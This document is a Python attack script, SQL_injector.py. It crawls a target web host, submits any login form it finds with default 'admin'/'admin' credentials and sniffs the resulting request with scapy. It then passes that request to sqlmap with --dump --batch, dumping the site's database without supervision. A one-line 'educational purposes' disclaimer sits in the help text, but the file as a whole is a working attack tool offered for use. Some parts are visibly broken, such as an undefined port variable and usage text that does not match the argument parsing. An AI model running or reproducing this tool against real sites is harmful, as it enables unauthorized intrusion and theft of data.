#!/bin/python3

import scapy.all as sc
import base64
import os
import sys
import mechanicalsoup
import re
import sys
import subprocess
from threading import Thread
from time import sleep

def decode_request(RAW_string):
    #Create empty dict that will store all request params
    load_dict = {}

    # Split body and change it to a dictionary so that all parameters can be easily acessible
    for i,x in enumerate(RAW_string.split('\n')[1:-2]):
        splitted = x.split()
        if splitted != []:
            load_dict[splitted[0]] = " ".join(splitted[1:])

    return load_dict
#

def sniff_and_inject(ip_address, timeout, path_to_sqlmap):
    #Starting sniffing the network in scapy
    print("Sniffing on the go, now access vulnerable webpage and do the job.")
    results = sc.sniff(filter="dst net "+ip_address, timeout=timeout)

    #Create table of intercepted packets,
    r_table = []
    load_index = 0
    packet_load = b''

    print(results)

    for i,x in enumerate(results):
        r_table.append(x.summary())
        #Check which packet contains the HTTP request
        if 'Raw' in x.summary():
            # Just to omit first payload, which is typically GET request
            if 'GET' not in x.load.decode():
                packet_load += x.load

    #Decode intercepted packet into easily accessible set of variables
    load_dict = decode_request(packet_load.decode())

    #Save parameters into a new file with format acceptable by sqlmap
    save_to_sqlmapfile(load_dict, packet_load)

    #Possible sqlmap paths:
    # /usr/share/sqlmap/sqlmap.py
    # /usr/share/golismero/plugins/testing/attack/sqlmap.py
    # /usr/share/golismero/tools/sqlmap/sqlmap.py
    # /usr/local/lib/python3.7/dist-packages/sqlmap/sqlmap.py

    #Finally run sqlinjection with all parameters (note - sqlmap_params.xml has automatically been written to before)
    print('Data saved. Now running sqlmap with acquired parameters: ','\n','-'*50,'\n')
    #subprocess.call(['gnome-terminal','--',path_to_sqlmap,' ','-r ','sqlmap_params.xml ','--dump ', '--batch ', '--answer="redirect=N" '])
    os.system(path_to_sqlmap+' -r sqlmap_params.xml --dump --batch --answer="redirect=N"')

    print('sqlmap finished. Results above...........','\n','-'*50,'\n')
#

def save_to_sqlmapfile(load_dict, packet_load):

    #XML format for sqlmap read
    sqlmap_string ="""
    <item>
        <url><![CDATA[{0}]]></url>
        <host ip="{1}">{1}</host>
        <port>{2}</port>
        <protocol>http</protocol>
        <method><![CDATA[{3}]]></method>
        <path><![CDATA[{4}]]></path>
        <extension>{5}</extension>
        <request base64="true"><![CDATA[{6}]]></request>
    </item>
    """

    #Bytes into readable string
    RAW_string = packet_load.decode()

    #Divide packet into main sections
    dec_header = RAW_string.split('\n')[0]
    dec_res = RAW_string.split('\n')[1:-2]
    dec_param = RAW_string.split('\n')[-1]

    #Get parameters needed to code SQLmap friendly format
    url = load_dict['Referer:']
    ip = load_dict['Host:']
    method = dec_header.split()[0]
    path = dec_header.split()[1]
    extension = "php"
    load_b64 = base64.b64encode(packet_load).decode()

    #Save to sqlmap friendly file
    file_sqlmap = open('sqlmap_params.xml','w+')
    file_sqlmap.write(sqlmap_string.format(url, ip, port, method, path, extension, load_b64))
    file_sqlmap.close()
#

#Function which looks for 'form' keyword in a page to submit it
def submit_form(page, browser, delay):
    sleep(delay)
    print("Found <form> markup in the page.")
    print("Getting form fields...")

    #Select only fragment of page containing form
    form = page[page.index('<form'):page.index('</form>')].split("\n")

    #Gather all input names into a list
    form_names=[]
    for y in form:
        searchObj = re.search( r' name="(.*?)"(.*?)', y)
        if searchObj:
            form_names.append(str(searchObj.group()).split('"')[-2])

    #Select the only form o a page
    browser.select_form('form')

    # specify username and password
    if len(form_names) >= 2:
        browser[form_names[0]] = 'admin'
        browser[form_names[1]] = 'admin'
        #submit form
        response = browser.submit_selected()
        return 0

    return 1
#

#Page which looks for links in a page to follow them
def get_hrefs(page, f_links):
    for y in page.split('\n'):
        searchObj = re.search( r'(.*?)href="(.*?)"(.*?)', y)
        if searchObj:
            f_links.append(str(searchObj.group()).split('"')[-2])
#

#Just checking if page contains form, some links (hrefs), or nothing
def check_webpage(page):
    f_links = []
    if 'form' in page:
        return 0
    elif 'href' in page:
        f_links = []
        get_hrefs(page, f_links)
        return f_links
    else:
        return 1
#

if __name__ == "__main__":

    # Default settings
    ports = [80,]
    ip_address = '127.0.0.1'
    timeout = 3
    delay = 1 #This is for threading comfort. Sniffing must have time to start before web will be accessed
    path_to_sqlmap='/usr/local/lib/python3.7/dist-packages/sqlmap/sqlmap.py'
    #

    # Check whether all args were supplied
    if len(sys.argv) == 1:
        print("usage: ./SQL_injector.py <target_ip>  (Use -h for help and additional arguments)")
        exit()

    if len(sys.argv) >= 2:
        ip_address = sys.argv[1]

    if len(sys.argv) >= 3:
        timeout = int(sys.argv[2])

    if len(sys.argv) >= 4:
        path_to_sqlmap = sys.argv[3]

    # Optionally, print help
    if sys.argv[1] == '-h':
        print("""
        <target_port> (default 80) ----> port on which application is running
        <timeout> (default 3) ----> timeout for sniffing packets (advanced)
        <path to sqlmap> ----> just run command #find / -name sqlmap.py# and paste any of outputted paths if script doesn't work
        TODO: [-m] (optional)  ----> doesn't automatically connect, just waits for a user to do that


        Extented usage would look as follows:
        ./SQL_injector.py <target_ip> <target_port> [-m] <packet_count> <path to sqlmap>

        If you run this script 1-st time, do as follows:
        1. Run this script in a terminal
        2. Open page where you want to use sql injection
        3. Type any credentials, log in
        4. Now this script will do the rest for you. You can ocassionally check if sqlmap_param
           itself has any questions, otherwise sit, relax and wait for the database dump!

        (only for educational purposes)
        """)
        exit()

    #Open page on desired port
    for port in ports:
        web_link = 'http://' + ip_address +':'+ str(port) + '/'

        # open url in new browser
        browser = mechanicalsoup.StatefulBrowser()
        browser.open(web_link)
        page = str(browser.get_current_page())

        answer = check_webpage(page)

        if answer == 1:
            print("Nothing interesting on ",port," port. Dead end.")
        if answer == 0:
            Tsubmit = Thread(target=sniff_and_inject, args=(ip_address, timeout, path_to_sqlmap))
            Tsubmit.start()
            submit_form(page,browser,delay)
            #sniff_and_inject(ip_address, timeout, path_to_sqlmap)
            Tsubmit.join()
        #NOTE - this script assumes that maximal level of recursion
        #(getting into sublevels) is two.
        if type(answer) == type([]):
            #Visiting each of found links
            for subpage in answer:
                try:
                    browser.open(web_link+subpage)
                except mechanicalsoup.utils.LinkNotFoundError:
                    print('Mechanicalsoup: Link not found!')
                else:
                    s_page = str(browser.get_current_page())
                    answer = check_webpage(s_page)

                    if answer == 1:
                        print("Nothing interesting in ",subpage,". Dead end.")
                    if answer == 0:
                        Tsubmit = Thread(target=submit_form, args=(s_page,browser,delay))
                        Tsubmit.start()
                        sniff_and_inject(ip_address, timeout, path_to_sqlmap)
                        Tsubmit.join()
#
